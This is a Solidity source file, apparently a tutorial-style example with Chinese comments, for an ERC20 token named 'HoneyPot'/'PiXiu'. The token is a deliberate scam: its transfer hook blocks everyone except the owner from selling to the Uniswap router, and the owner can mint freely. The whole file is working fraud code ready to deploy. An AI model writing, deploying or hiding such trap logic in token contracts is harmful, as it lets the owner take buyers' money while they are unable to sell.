// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

// 极简貔貅ERC20代币，只能买，不能卖
contract HoneyPot is ERC20, Ownable {
    address public swapRouter;

    // 构造函数：初始化代币名称和代号
    // Uniswap Router address: 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
    constructor(address swapRouter_) ERC20("HoneyPot", "PiXiu") {
        swapRouter = swapRouter_;
    }
    
    /**
     * 铸造函数，只有合约所有者可以调用
     */
    function mint(address to, uint amount) public onlyOwner {
        _mint(to, amount);
    }

    /**
     * @dev See {ERC20-_beforeTokenTransfer}.
     * 貔貅函数：只有合约拥有者可以卖出
     */
    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual override {
        super._beforeTokenTransfer(from, to, amount);
        // 当转账的目标地址为 uniswap router 合约时，会revert
        if(to == swapRouter){
            require(msg.sender == owner(), "Can not Transfer");
        }
    }
}